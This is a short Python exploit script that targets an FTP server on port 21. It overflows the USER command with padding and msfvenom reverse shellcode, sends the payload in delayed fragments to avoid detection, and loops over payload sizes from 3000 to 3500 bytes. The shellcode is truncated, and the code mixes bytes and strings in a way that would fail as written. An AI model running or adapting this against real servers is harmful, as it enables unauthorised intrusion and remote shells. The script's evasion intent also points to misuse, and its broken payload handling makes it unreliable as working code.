import socket
import time

target_ip = "YOUR-T4RG3T-IP"
target_port = 21

# Reverse shellcode generated with msfvenom (truncated for simplicity)
shellcode =  b"\xdb\xc4\xd9\x74\x24\xf4\x5b\xbe\x1c\x52\x57\x5e\x2b"

def exploit_ftp(payload_size):
    try:
        exploit_payload = "A" * (payload_size - len(shellcode)) + shellcode

        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((target_ip, target_port))

        response = ftp_socket.recv(1024)
        print(f"Respuesta del servidor: {response.decode('utf-8')}")
        # we want to be undetectable so we send the payload in fragments and we add time delay
        fragment_size = 1000
        for i in range(0, len(exploit_payload), fragment_size):
            fragment = exploit_payload[i:i+fragment_size]
            ftp_socket.send(b"USER " + fragment.encode() + b"\r\n")
            time.sleep(0.5)

        print(f"[*] Payload de {payload_size} bytes enviado en fragmentos.")

        time.sleep(1)
        ftp_socket.send(b"PASS pass123\r\n")
        print("[*] Comando PASS enviado después del exploit.")

        time.sleep(2)

        response = ftp_socket.recv(1024)
        print(f"Respuesta del servidor después del exploit: {response.decode('utf-8')}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        ftp_socket.close()

if __name__ == "__main__":
    for size in range(3000, 3500, 100):
        print(f"\n[*] Probando con payload de tamaño {size} bytes")
        exploit_ftp(size)
        time.sleep(2)

